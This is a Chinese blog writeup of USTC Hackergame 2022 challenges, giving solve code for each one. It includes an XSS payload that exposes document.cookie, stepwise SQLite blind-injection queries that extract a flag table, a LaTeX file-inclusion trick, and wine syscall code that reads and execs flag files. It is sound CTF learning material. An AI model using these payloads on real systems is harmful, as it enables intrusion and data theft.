---
title: "USTC Hackergame 2022 Writeup"
image: /assets/img/cover/ustc-hackergame-2022-writeup.png
date: "2022-10-29 17:08:42 +0800"
---

> 题图是本次 USTC Hackergame 我的题目完成情况

一年一度的 USTC Hackergame 又开始了。去年我的成绩好像不错，今年也来玩一玩。和去年一样，今年也是每做一题就写一题的 Writeup，这样就不会因为比赛结束之后没有动力写而咕掉了。

以下按照解题时间顺序排序，有多个小题的，各小题分开排列。为了简单，题目本身的描述我就不写在 Writeup 里了，大家可以去 [官方 Writeup](https://github.com/USTC-Hackergame/hackergame2022-writeups){: target="_blank" rel="noopener"} 查看。

## 签到

和往年一样，识别的结果写在 URL search param 里了，所以我直接按照要求填入 2022。

```js
location.href=`http://202.38.93.111:12022/?result=2022`
```

不过看了官方题解才发现其实是能手动点出来的啊……（当然，只是有这个可能性而已。）

## HeiLang

按照题目要求写个 HeiLang 编译器不就好了嘛。不过我这里为了方便写的比较简略，但是应对题目中的那个文件还是没问题的。代码如下：

```js
const fs=require("fs-extra")

const data=fs.readFileSync("./getflag.hei.py",{"encoding":"utf-8"})
const result=data.replaceAll(/([a-zA-Z_0-9]+)\[([0-9 \|]+)\] = ([0-9]+)/g,(_,a,ks,v)=>{
	console.log(ks,v)
	return ks.split(" | ").map(k=>`${a}[${k}] = ${v}`).join("; ")
})
fs.writeFileSync("getflag.py",result)
```

## Xcaptcha

当然是让电脑帮我们来算。本来想写成浏览器用户脚本的，但是限于浏览器本身渲染网页的速度，并不能在一秒之内提交结果，所以就改成直接 fetch 了。代码如下：

```js
(async () => {
	const question = await (await fetch("http://202.38.93.111:10047/xcaptcha", {
		"headers": {
		  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		  "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5,ja-JP;q=0.4,ja;q=0.3,ar-XB;q=0.2,ar;q=0.1",
		  "cache-control": "no-cache",
		  "pragma": "no-cache",
		  "upgrade-insecure-requests": "1"
		},
		"referrer": "http://202.38.93.111:10047/xcaptcha",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": null,
		"method": "GET",
		"mode": "cors",
		"credentials": "include"
	  })).text()
	const match = question.matchAll(/([0-9]+)\+([0-9]+)/g)
	const answer = new URLSearchParams()
	;[...match].forEach((m, i) => {
		answer.set(`captcha${i+1}`, ((BigInt(m[1]) + BigInt(m[2]))).toString())
	})
	console.log([...answer])
	const result = await (await fetch("http://202.38.93.111:10047/xcaptcha", {
		"headers": {
		  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		  "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5,ja-JP;q=0.4,ja;q=0.3,ar-XB;q=0.2,ar;q=0.1",
		  "cache-control": "no-cache",
		  "content-type": "application/x-www-form-urlencoded",
		  "pragma": "no-cache",
		  "upgrade-insecure-requests": "1"
		},
		"referrer": "http://202.38.93.111:10047/xcaptcha",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": answer,
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
	  })).text()
})()
```

## 猫咪问答喵

惯例的搜索引擎使用技巧考试。

- 对于第一题，顺便找一个 NEBULA 战队的新闻通稿，就能在文中介绍 NEBULA 战队的部分找到。我找的是 [这一篇](https://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm){: target="_blank" rel="noopener"}。
- 对于第二题，在 LUG @ USTC 的 Wiki 中可以找到所有相关演讲的幻灯片，那么 [这个演讲的幻灯片](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf){: target="_blank" rel="noopener"} 当中当然有答案。是 15 页那张图，不是前面的。
- 对于第三题，直接搜索 Firefox 和 Windows 2000 大概能找到不太准确的答案，再根据 [FireFox 官方某个版本系统要求页面的描述](https://www.mozilla.org/en-US/firefox/12.0/system-requirements/){: target="_blank" rel="noopener"} 和 [它后面那个版本的描述](https://www.mozilla.org/en-US/firefox/13.0/system-requirements/){: target="_blank" rel="noopener"} 就能得到准确的结果。
- 对于第四题，在 [Linux 内核源码仓库的 GitHub 镜像](https://github.com/torvalds/linux){: target="_blank" rel="noopener"} 中搜索对应的 CVE 编号即可找到。
- 对于第五题，直接搜索这串 fingerprint 肯定是不行的，但是稍加搜索就可以知道使用 [Shodan](https://www.shodan.io/){: target="_blank" rel="noopener"} 可以对 SSH fingerprint 进行搜索。不过本题的答案本身还是很有意思的。
- 对于第六题，在中科大网络信息中心的官网上可以看到，然而由于最近一次改定价并没有改这一种服务的的定价，所以应该填 [更早一次定价修改的文件](http://ustcnet.ustc.edu.cn/2003/0301/c11109a210890/page.htm){: target="_blank" rel="noopener"} 中的时间。

不过本届的猫猫问答提交之后会提示答对的题目数量了，大概也更容易爆破一些题目的答案了吧。

## 家目录里的秘密 - VS Code 里的 flag

打开压缩包随便看看，发现 `.config` 文件夹特别大。点进去发现了 `Code` 文件夹，大概是和 VSCode 有关的内容了，随便翻一翻便在 `User\History` 下面找到了编辑历史明文，里面就有答案。

## 家目录里的秘密 - Rclone 里的 flag

在 `.config\rclone` 里面找到了 Rclone 的配置文件，然而其中指向的 ftp 服务器是 	`ftp.example.com` ，显然是连不上去的。不过搜索得知 Rclone 会混淆配置文件中的密码，说不定混淆前的密码就是答案。搜索得知有 [现成的代码](https://forum.rclone.org/t/how-to-retrieve-a-crypt-password-from-a-config-file/20051){: target="_blank" rel="noopener"} 可以用来解开混淆，运行之后发现果然是答案。

## 旅行照片 2.0 - 照片分析

上次的旅行照片没有利用图片 EXIF 元信息的部分，这次就有了。对于 Windows 用户，只需要右键属性一下图片文件就可以获得所有的答案。

## 旅行照片 2.0 - 社工入门

放大图片可以得知图中的建筑上的文字表明它是 [ZOZO Marine Stadium](https://en.wikipedia.org/wiki/ZOZO_Marine_Stadium){: target="_blank" rel="noopener"} （真好啊真好啊，我也想去日本旅游）可以在 [在线地图](https://www.google.com/maps/place/ZOZO%E6%B5%B7%E6%B4%8B%E7%90%83%E5%9C%BA/@35.645196,140.030858,17z/data=!4m5!3m4!1s0x602281f64a6b928d:0x6df5d2c745778da9!8m2!3d35.6451583!4d140.0308307?hl=zh-CN){: target="_blank" rel="noopener"} 上找到它的邮政编码。但是这并非是正确答案，因为拍照人所在地点是 [旁边的酒店](https://www.google.com/maps/place/APA+HOTEL%26+RESORT+TOKYO+BAY+MAKUHARI/@35.6443939,140.0355143,17z/data=!4m15!1m6!3m5!1s0x602281f64a6b928d:0x6df5d2c745778da9!2zWk9aT-a1t-a0i-eQg-Wcug!8m2!3d35.6451583!4d140.0308307!3m7!1s0x6022821f18817a27:0xfa8bcc6837f106cd!5m2!4m1!1i2!8m2!3d35.6441113!4d140.0371528?hl=zh-CN){: target="_blank" rel="noopener"}，邮政编码有微小的差别。

从 EXIF 元信息来看，摄像机型号为 sm6115，也就对应于高通骁龙 662。在小米和红米的手机下查找高通骁龙 662，并对照图片中的手机型号，可以得知设备是 [红米Redmi Note 9 4G版](https://www.mi.com/redminote9-4g/specs){: target="_blank" rel="noopener"}，在小米的设备参数介绍页面可以得到屏幕分辨率。

有了位置和时间信息，就可以通过航班数据库查询对应的航班了。然而，由于公开的航班数据库似乎基本上不会对公众免费开放历史数据查询，所以只好在 [flightradar24](https://www.flightradar24.com/){: target="_blank" rel="noopener"} 上蹭了一下它的免费试用版。最后找到了对应的航班。需要注意的是，当地时区是 UTC+9，填时间的时候需要注意换算。不过按照官方题解，在 [ADSB Exchange](https://globe.adsbexchange.com/?r){: target="_blank" rel="noopener"} 上其实是有回放功能的，比赛时我没有在界面上找到这个功能，原来是需要填写特定 URL search param 才能启用的隐藏功能啊。

## 猜数字

鉴于后端判断的代码中认为猜的数不大于正确的数并且猜的数不小于正确的数即为猜对，那么我只需要猜一个 NaN 那就一定能猜对。不过前端做了限制不能直接猜 NaN，然而我们可以手动发请求啊。

## LaTeX 机器人 - 纯文本

只需要使用 `\input` 把对应文件包含进来即可。

## LaTeX 机器人 - 特殊字符混入

加入井号等特殊符号以后，直接 `\input` 就会报语法错误了。不过 [搜索发现](https://tex.stackexchange.com/questions/422197/latex-environment-to-write-in-plain-text-mode){: target="_blank" rel="noopener"}，通过自定义环境重写字符种类，可以让井号和下划线被当作普通字符来使用。那么使用如下 LaTeX 代码便能显示对应文件内容：

```latex
\newenvironment{simplechar}{\catcode`\#=12\catcode`\_=12}{}\begin{simplechar}\input{/flag2}\end{simplechar}
```

## 安全的在线测评 - 无法 AC 的题目

居然没有限制文件读写，那直接把答案文件复制出来不就好了。

```c
#include <stdio.h>
#define BLOCK 1024

int main()
{
	FILE *fp = fopen("./data/static.out", "r");
	char b[BLOCK]={0};
	while (1 == 1)
	{
		size_t ret_code = fread(b, sizeof *b, BLOCK, fp);
		fwrite(b, sizeof *b, ret_code, stdout);
		if (ret_code < BLOCK)
		{
			break;
		}
	}
	return 0;
}
```

## 线路板

找一个 [在线的支持线框模式的 Gerber 文件查看器](https://gerber-viewer.ucamco.com/){: target="_blank" rel="noopener"}，把 zip 拖进去，然后抄写即可。


## Flag 自动机

首先来解决狠心夺取按钮会动的问题。用 Ghidra 打开，搜索界面中的文本，发现程序使用 WinAPI 创建了按钮之后把句柄存在了全局变量中。再寻找全局变量的引用，发现它会在某一个分支中随机移动按钮的位置。把对应的分支指令改掉再打开，发现狠心夺取后会提示不是超级管理员。再搜索对应字符串发现它会在一个分支里弹出提示而在另一个分支输出 flag，找到对应分支指令改掉再运行就能拿到答案了。

## 微积分计算小练习

只需把答案输进 Wolfram|Alpha 即可得到答案……啊不，这样只是得到微积分计算的答案而已。

要让访问页面的 Bot 把 flag 吐出来，那需要构造 XSS。练习成绩页面内我们能控制的内容只有姓名，测试发现果然没有过滤。不过直接插入 script 标签的话是不执行的，那就用经典的 `img` 标签的 `onerror` 属性好了。以下是我的姓名（确信）：

```html
毕辟希 - <img src="" onerror="setInterval(()=>document.querySelector('#score').textContent=document.cookie,10)"/>
```

## 企鹅拼盘 -  这么简单我闭眼都可以！

一共只有 4 比特一共 16 种输入，那当然是手动枚举一下就行了！

## 光与影

查看源代码，发现是基于有符号距离函数的 Ray marching 渲染器（以前我还 [专门写了文章介绍这种做法](https://benpigchu.github.io/pikanote/article/shadertoy-raymarching-sdf.html){: target="_blank" rel="noopener"}）。其中 `t5SDF` 一项显然是那个巨大的挡住 flag 内容的东西，用 Chrome 的开发者工具的 Source 一栏内的 Overrides 一项把这一部分去掉再渲染就能看到答案了。

## 杯窗鹅影 - flag1

经过一番搜索，发现 [wine 中运行的 Windows 程序似乎居然可以直接调用 Linux 系统调用](https://www.reddit.com/r/linux/comments/5nuq9i/linux_syscalls_in_exe_running_through_wine/){: target="_blank" rel="noopener"}（我还以为有 [拦截 syscall 重新实现的机制](https://lwn.net/Articles/824380/){: target="_blank" rel="noopener"} 呢）。那么，为了确认我们还需要造一个能调用 Linux 系统调用的 Windows 程序。由于 MSVC 的 x64 版本根本不支持内联汇编，我决定用 MASM 硬写汇编。这里我参考了 [这份教程](https://github.com/RahmatSaeedi/MASM_Tutorials){: target="_blank" rel="noopener"}。以下是实验代码：

```nasm
.code
main    proc
        mov     rdi, 1
        lea     rsi, msg
        mov     rdx, 11
        mov     rax, 1
		syscall
        mov     rdi, 0
        mov     rax, 60
		syscall

main    endp
.data
msg             byte        "Hello World", 0Ah, 0Dh
        end
```

编译指令如下（需要使用 Visual Studio 的那个 x64 Native Tools Command Prompt）：

```console
ml64.exe a.asm /link /SUBSYSTEM:CONSOLE /ENTRY:main /OUT:a.exe
```

上传后居然可以输出 Hello World，说明这样确实工作。那么为了拿到第一个 flag，我们只需要读写 `/flag1` 文件即可。代码如下：

```nasm
.code
main    proc
        lea     rdi, filename
        mov     rsi, 0
        mov     rdx, 0
        mov     rax, 2
		syscall
        mov     rdi, rax
        lea     rsi, msg
        mov     rdx, 1024
        mov     rax, 0
		syscall
        mov     rdi, 1
        lea     rsi, msg
        mov     rdx, rax
        mov     rax, 1
		syscall
        mov     rdi, 0
        mov     rax, 60
		syscall

main    endp
.data
filename             byte        "/flag1"
msg             byte        00h dup (1024)
        end
```

## 杯窗鹅影 - flag2

这次我们直接执行 exec。代码如下：

```nasm
.code
main    proc
        lea     rdi, filename
        mov     rsi, 0
        mov     rdx, 0
        mov     rax, 59
		syscall
        mov     rdi, 0
        mov     rax, 60
		syscall

main    endp
.data
filename             byte        "/readflag"
msg             byte        00h dup (1024)
        end
```

## 企鹅拼盘 - 大力当然出奇迹啦~

如小题名称所述，大力出奇迹，直接遍历爆破。为此我在题目代码中加入了专门的爆破功能，代码如下：

```py
    async def action_test(self):
        self.pc = 0
        for i in range(2**self.bitlength):
            self.inbits=[(i//(2**b))%2 for b in range(self.bitlength)]
            self.pc = 0
            self.pc = len(self.branches)
            self.run_pc(self.pc)
            if bool(self.board):
                self.watch_pc(self.pc)
                break
            if i%256==0:
                self.watch_pc(self.pc)
```

上面的代码里有个新的 run_pc，这是因为为了减少图形界面的刷新把计算和显示分开了。

```py
    def run_pc(self, index):
        self.board.reset()
        for branch in self.branches[:index]:
            self.board.move(branch[1] if self.inbits[branch[0]] else branch[2])
        for i in range(16):
            self.blocks[i].set_i(self.board.b[i//4][i % 4])

    def watch_pc(self, index):
        self.run_pc(index)
        self.info.set_info({'bT': self.branches[index][1] if index < len(self.branches) else '',
                            'bF': self.branches[index][2] if index < len(self.branches) else '',
                            'inbits': self.inbits,
                            'ib': self.branches[index][0] if index < len(self.branches) else -1,
                            'scrambled': bool(self.board),
                            'pc': index,
                            'lb': len(self.branches),
                            'hl': -1})
```

实际爆破用时还挺长的，所以第三小题肯定不能爆破。

## 企鹅拼盘 - 这个拼盘。。能靠掀桌子弄乱吗？

这个数据量，就算是 z3 也是不能直接解出来的。然而观察描述分支的文件，发现每一个分支的判断条件有明显的四个一组 ABAB 的规律。再测试第一题中运行到第四步的结果，发现，只有在 2 和 3 两个比特为特定值时才会有不同的结果，那么大概可以利用这一点得到期望的输入。代码如下：

```py
import json
from itertools import zip_longest

def grouper(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)

class Board:
    def __init__(self):
        self.b = [[i*4+j for j in range(4)] for i in range(4)]

    def _blkpos(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] == 15:
                    return (i, j)

    def reset(self):
        for i in range(4):
            for j in range(4):
                self.b[i][j] = i*4 + j

    def move(self, moves):
        for m in moves:
            i, j = self._blkpos()
            if m == 'L':
                self.b[i][j] = self.b[i][j-1]
                self.b[i][j-1] = 15
            elif m == 'R':
                self.b[i][j] = self.b[i][j+1]
                self.b[i][j+1] = 15
            elif m == 'U':
                self.b[i][j] = self.b[i-1][j]
                self.b[i-1][j] = 15
            else:
                self.b[i][j] = self.b[i+1][j]
                self.b[i+1][j] = 15

    def revmove(self, moves):
        for m in reversed(moves):
            i, j = self._blkpos()
            if m == 'R':
                self.b[i][j] = self.b[i][j-1]
                self.b[i][j-1] = 15
            elif m == 'L':
                self.b[i][j] = self.b[i][j+1]
                self.b[i][j+1] = 15
            elif m == 'D':
                self.b[i][j] = self.b[i-1][j]
                self.b[i-1][j] = 15
            else:
                self.b[i][j] = self.b[i+1][j]
                self.b[i+1][j] = 15

    def __bool__(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] != i*4 + j:
                    return True
        return False

    def __eq__(self, other):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] != other.b[i][j]:
                    return False
        return True

def reduceBranches(branches,bit):
    board=Board()
    for i in range(len(branches)):
        board.move(branches[i][bit[i]])
    return board

def generateResult(branches,value):
    return {
        branches[0][0]:value[0],
        branches[1][0]:value[1],
    }

def analyze(branches):
    if branches[0][0] != branches[2][0]:
        print(f"invalid chunk")
    if branches[1][0] != branches[3][0]:
        print(f"invalid chunk")
    print(branches[0][0],branches[1][0])
    board00=reduceBranches(branches,[2,2,2,2])
    board01=reduceBranches(branches,[2,1,2,1])
    board10=reduceBranches(branches,[1,2,1,2])
    board11=reduceBranches(branches,[1,1,1,1])
    print(board00.b)
    print(board01.b)
    print(board10.b)
    print(board11.b)
    if (board00 == board01) and (board01 == board10)  and (board10 != board11) :
        print("11")
        return generateResult(branches,[1,1])
    if (board01 == board10) and (board10 == board11)  and (board11 != board00) :
        print("00")
        return generateResult(branches,[0,0])
    if (board10 == board11) and (board11 == board00)  and (board00 != board01) :
        print("01")
        return generateResult(branches,[0,1])
    if (board11 == board00) and (board00 == board01)  and (board01 != board10) :
        print("10")
        return generateResult(branches,[1,0])

def solve(bitlength,branches):
    result=dict()
    for branchChunk in grouper(branches,4):
        part=analyze(branchChunk)
        for k,v in part.items():
            if k in result and result[k]!=v:
                print("conflict result")
            result[k]=v
    print("".join([f"{result[i]}" for i in range(bitlength)]))


def dochal(bitlength, obf):
    filename = f'chals/b{bitlength}{"_obf" if obf else ""}.json'
    with open(filename) as f:
        branches = json.load(f)
        solve(bitlength,branches)

dochal(64, True)
```

这么一看，大概能理解这个题目的数据是怎么构造的了。只需要把每个输入拆成两个输入，把每个分支拆成四个分支就可以增加一层的复杂度，三小题分别拆了 2、4、6 层。不过真的看了官方题解的混淆方法之后还是大为震撼的。

## 置换魔群 - 置换群上的 RSA

什么置换魔群，不就是大一点的置换群嘛。由于置换群的每一个元素都可以拆成若干个环，所以我们只需要针对各个环分别击破就好。对于 `secret**e` 中的一个阶为 `l` 的环，我们只需要把这个环自乘 `pow(e,-1,l)` 次即可。注意 `e` 是素数而且显然大于 `l`，所以一定能算出来。最后把各个环再拼回去就能得到答案。以下为代码。

```py
import pwn
import json
from permutation_group import permutation_element, permutation_group

conn = pwn.remote('202.38.93.111',10114)
conn.send(b'<id>:<token>\n')
conn.recvuntil(b"> your choice: ")
conn.send(b'1\n')

for _ in range(15):
	conn.recvuntil(b"n = ")
	n = int(conn.recvuntil(b",")[:-1])
	conn.recvuntil(b"e = ")
	e = int(conn.recvuntil(b"\n")[:-1])
	print(n,e)
	conn.recvuntil(b"here: \n")
	p = permutation_element(n,json.loads(conn.recvuntil(b"]")))
	print(p.standard_tuple)
	new_list=list(range(1, n+1))
	for std_tuple in p.standard_tuple:
		l=len(std_tuple)
		step=pow(e,-1,l)
		print(step,l,e)
		for i in range(l):
			new_list[std_tuple[i]-1]=std_tuple[(i+step)%l]
	print(new_list)
	new_p=permutation_element(n,new_list)
	print(new_p**e==p)
	conn.recvuntil(b"> your answer: ")
	conn.sendline(bytes(str(new_p),encoding="utf-8"))

conn.interactive()
```

## 置换魔群 - 置换群上的 DH

由于置换群的每一个元素都可以拆成若干个环，所以我们只需要针对各个环分别击破就好（再度）。对于每一个 `g` 中的环，我们只需要检查公钥中这个环中的元素在私钥中的对应的下一个元素在原来的环中的位置，就可以知道 `secret` 对这个环的长度取模后的值了。最后利用中国剩余定理就可以得到答案。代码如下。

```py
import pwn
import json
from sympy.ntheory.modular import crt
from permutation_group import permutation_element, permutation_group

conn = pwn.remote('202.38.93.111',10114)
conn.send(b'911:MEUCIAwRnzmZqFcPjbiKd9wmy3Ipxp7sZ6Qf8xxcKg7wrdOoAiEAlMbxiD12WWHv/Kc4mHHptGSXIc2Argrpa72lrVJA8Ho=\n')
conn.recvuntil(b"> your choice: ")
conn.send(b'2\n')

for _ in range(15):
	conn.recvuntil(b"n = ")
	n = int(conn.recvuntil(b",")[:-1])
	conn.recvuntil(b"g = ")
	g = permutation_element(n,json.loads(conn.recvuntil(b"]")))
	print(n)
	conn.recvuntil(b"key = ")
	key = permutation_element(n,json.loads(conn.recvuntil(b"]")))
	print(g.standard_tuple)
	print(key.standard_tuple)
	mods=list()
	vals=list()
	for std_tuple in key.standard_tuple:
		first=std_tuple[0]
		second=std_tuple[1 if len(std_tuple) > 1 else 0]
		mapped_tuple=next(x for x in g.standard_tuple if first in x)
		first_idx=mapped_tuple.index(first)
		second_idx=mapped_tuple.index(second)
		print(std_tuple,mapped_tuple)
		print(first_idx,second_idx)
		l=len(mapped_tuple)
		step=(second_idx-first_idx)%l
		print(l,step)
		mods.append(l)
		vals.append(step)
	result,modular=crt(mods,vals)
	print(result)
	print(g**result==key)
	conn.recvuntil(b"> your answer: ")
	conn.sendline(bytes(str(result),encoding="utf-8"))

conn.interactive()
```

## 链上记忆大师 -  记忆练习

基础 Solidity 合约编写问题，对着 Solidity 官方文档的示例抄一下就好了。

```sol
pragma solidity =0.8.17;

contract MemoryMaster {
	uint256 data;
    function memorize(uint256 n) external {
		data=n;
	}
    function recall() external view returns (uint256) {
		return data;
	}
}
```

## 蒙特卡罗轮盘赌

鉴于随机数序列可以被 srand 的种子完全确定，而且这个种子很接近当前时间，那只需要先猜错两轮获取信息，再把当前时间附近的整数当作种子进行枚举，那就能爆破出种子，然后就能猜对后面三轮了。爆破代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

double rand01()
{
	return (double)rand() / RAND_MAX;
}

int test()
{
	int M = 0;
	int N = 400000;
	for (int j = 0; j < N; j++) {
		double x = rand01();
		double y = rand01();
		if (x*x + y*y < 1) M++;
	}
	return M;
}


int main()
{
	unsigned int t=time(0);
	int t1=314181;//手动填入值
	int t2=313837;//手动填入值
	for(int i=t-300;i<t+3000;i++){
		srand(i);
		if(test()==t1){
			if(test()==t2){
				printf("猜对了！\n");
				printf("正确答案是：%1.5f\n", (double)test() / 100000);
				printf("正确答案是：%1.5f\n", (double)test() / 100000);
				printf("正确答案是：%1.5f\n", (double)test() / 100000);
				return 0;
			}
		}
	}
}
```

为了保证环境一致，我使用了题目中给出的 Dockerfile 稍加修改后构建的镜像运行我的爆破代码，这样就能保证生成随机数的方式和题目中完全一样了。

## 看不见的彼方

既然是同一个用户，那就可以互相发 signal 了。只需利用信号进行进程间通信，就能传递信息。具体的，先由 B 进行一个 `kill(-1,SIGUSR2)` 给所有能发信号的进程发信号，然后 A 就可以通过 `siginfo_t` 拿到 B 的 pid。之后就可以直接 `sigqueue(bpid,SIGUSR1,val)` 给 B 发信号传递信息，B 可以在 `siginfo_t` 取出对应的信息并打印。不过要注意，还需要在两个进程间同步，否则可能会丢包。不过我这里就直接 `usleep` 了。（按照官方题解，其实可以改用实时信号来同步。）

A 的代码如下：

```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

volatile int bpid=-1;

void handler(int sig, siginfo_t *info, void *ucontext) {
	bpid=info->si_pid;
}

int main()
{
  	struct sigaction sa;
	sa.sa_sigaction = (void *)handler;
	sigemptyset (&sa.sa_mask);
  	sa.sa_flags = SA_SIGINFO | SA_RESTART;
  	sigaction(SIGUSR2, &sa, NULL);

	while(bpid<0){}

	union sigval val;
	10;

	char token[64]={};

	int file=open("/secret",O_RDONLY);
	int size=read(file,token,64);

	for(int i=0;i<64;i++){
		usleep(100);
		val.sival_int=token[i];
		int ret = sigqueue(bpid,SIGUSR1,val);
	}

	return 0;
}
```

B 的代码如下：

```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>

volatile int count=0;

void handler(int sig, siginfo_t *info, void *secret) {
	printf("%c",info->si_value);
	fflush(stdout);
	count+=1;
}

int main()
{
  	struct sigaction sa;
	sa.sa_sigaction = (void *)handler;
	sigemptyset (&sa.sa_mask);
  	sa.sa_flags = SA_SIGINFO | SA_RESTART;
  	sigaction(SIGUSR1, &sa, NULL);

	usleep(100);

	kill(-1,SIGUSR2);

	while(count<64){

	}
	return 0;
}
```

为了保证环境一致，我使用了题目中给出的 Dockerfile 稍加修改后构建的镜像来编译我的代码。

## 片上系统 - 引导扇区

用 PulseView 直接打开压缩包，然后使用它的 protocol decoder 功能解析 SD 卡的 SPI 协议。设置 D0 为片选、D1 为时钟、D2 为命令数据、D3 为回复数据即可。不过由于一些 bug，命令与回执并没有完整解析出来。不过，既然传输的字节都解析出来了，我们可以把 “SPI: MISO data” 一行导出之后手动解析这些字节。脚本如下：

```js
const fs=require("fs-extra")

const file=fs.readFileSync("dataout.txt","utf-8")
const data=file.split("\n").slice(2)

const values=[]

data.forEach(line=>{
	const match=/[0-9]+-[0-9]+ SPI: MISO data: ([0-9A-Z]+)/.exec(line)
	if(match===null){
		return
	}
	values.push(parseInt(match[1],16))
})

console.log(values)

let r3=null
let r3s=[]

for(let i=0;i<values.length;i++){
	if(r3===null){
		if(values[i]===0xFE){
			r3=[]
		}
	}else{
		r3.push(values[i])
		if(r3.length>=512){
			r3s.push(r3)
			r3=null
		}
	}
}

fs.removeSync("dataout")
r3s.forEach(r3=>{
	fs.appendFileSync("dataout",Uint8Array.from(r3))
})

console.log(r3s.map(s3=>s3.map(x=>x.toString(16)).join(" ")))
```

在输出的文件的接近 0x200 位置就能找到答案。当然这里把后面几个区块也读了出来，后面的小题大概能用到。

## 片上系统 - 操作系统

那么，把第一个扇区的内容拖进 Ghidra，反汇编，拉到最下面发现最后是跳转到了 0x20001000 地址。那么，把剩下的扇区的内容拖进 Ghidra，反汇编，发现有 `flag{` 字符串，找到引用，阅读附近的代码，立即发现串口输出状态在 0x93000008、串口输出数据在 0x93000000。而在输出 `flag{` 和 `}` 之间则分别以 0x20001018、0xfeadae83、0xe0 为参数调用了位于 0x2000101 的函数。不妨给它起名为 `print_flag_content`。它的代码反汇编后如下：

```c
void print_flag_content(uint input)
{
  uint length;
  int v2;
  uint v1;
  int *sdata;
  int *sready;

  sdata = serial_data;
  sready = serial_ready;
  length = 0x1c;
  do {
    v1 = input >> (length & 0x1f) & 0xf;
    v2 = 0x30;
    if (9 < v1) {
      v2 = 0x57;
    }
    do {
    } while (*sready == 0);
    *sdata = v2 + v1;
    do {
    } while (*sready == 0);
    length = length - 4;
  } while (length != 0xfffffffc);
  return;
}
```

实际运行发现它只是把输入的数值以十六进制输出而已。由此便能得到答案。

## 你先别急

要想从数据库里偷信息，那就只能 SQL 注入了。为此我们先把获取验证码的代码复制下来改改准备一下。

```js
const refresh = (username)=>$.ajax({
	type: "POST",
	url: "/captcha",
	data: {
		username
	},
	success: function (data) {
		select.disabled = false;
		var result = data.result;
		if (result) {
			$("#capimg").attr("src", "data:image/png;charset=utf-8;base64," + result);
		}
	}
})
```

首先来验证一下是否能 SQL 注入。

```js
refresh("Simple-1'--")
```

这时发现验证码是纯数字，说明服务器认为这个用户名对应的是低风险用户，注入成功。经过如果是不存在的用户名或者 SQL 错误那么就会按照最高风险生成验证码。也就是说，我们只能每次注入从数据库获取一比特的信息。这就是所谓的 SQL 盲注吧。另外就是，由于我懒得想怎么自动识别这个验证码，所以我就手动注入了，毕竟我又不急嘛。（当然官方题解果然是自动识别验证码的。）

首先来确定是什么数据库。既然是快速写的，那多半是 sqlite 吧。那么我找了一份 [参考资料](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md){: target="_blank" rel="noopener"}，来试一试。

```js
refresh("Simple-1' and length(sqlite_version())>0 --")
```

成功，是 sqlite。接下来就是探测内容了。首先是看看有几张表。

```js
// 探测表的数量是否大于 n
(n)=>refresh(`Simple-1' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) > ${n} --`)
```

对不同的 n 进行试验，发现一共有两张表。那么来探测一下表名。首先是表名长度。

```js
// 探测第 n 个表的表名长度是否大于 l
(n,l)=>refresh(`Simple-1' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset ${n}) > ${l} --`)
```

那么第一张表表名长度为 5，第二张表表名长度为 4。合理猜测，是 users 和 flag。来验证一下。

```js
// 探测第 n 个表的表名是否为 s
(n,s)=>refresh(`Simple-1' and (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset ${n}) = '${s}' --`)
```

那么，果然没猜错。那么接下来就是探测表结构了。

```js
// 探测第 flag 表创建时的 SQL 语句长度是否大于 n
(n)=>refresh(`Simple-1' and (SELECT length(sql) FROM sqlite_master WHERE type='table' and tbl_name='flag') > ${n} --`)
// 探测第 flag 表创建时的 SQL 语句从第 f 个字符开始是否为 s 字符串
(s,f)=>refresh(`Simple-1' and (SELECT substr(sql,${f},${s.length}) FROM sqlite_master WHERE type='table' and tbl_name='flag') = '${s}' --`)
```

经过一番探测和猜测，得到了 flag 表的结构

```sql
CREATE TABLE flag (flag text)
```

那么，接下来是探测 flag 的内容了。由于 flag 中可能出现的字符种类很多，所以还需要有更先进的探测方式。

```js
// 探测第 flag 长度是否大于 n
(n)=>refresh(`Simple-1' and (SELECT length(flag) FROM flag) > ${n} --`)
// 探测第 flag 的第 f 个字符的 ACSII 编码是否大于字符 c 的
(c,f)=>refresh(`Simple-1' and (SELECT hex(substr(flag,${f},1)) FROM flag) > hex('${c}') --`)
// 探测第 flag 第 f 个字符开始是否为 s 字符串
(s,f)=>refresh(`Simple-1' and (SELECT substr(flag,${f},${s.length}) FROM flag) = '${s}' --`)
```

如此便可以探测出 flag 的内容了。

## Flag 的痕迹

本来打算爆破对应的 rev 编号的（因为 Dokuwiki 的 rev 编号非常接近编辑时间），但是跑了半天只爆破出了当前版本的 rev 编号。另一方面鼓捣了半天各种 do 的 action 没有结果，最后在 do=diff 的界面中找到了旧版本。一开始是因为觉得 diff 一定需要有两个 rev 才能进行，没想到它会默认使用最新版本并且会在页面中吐出所有的版本的列表。

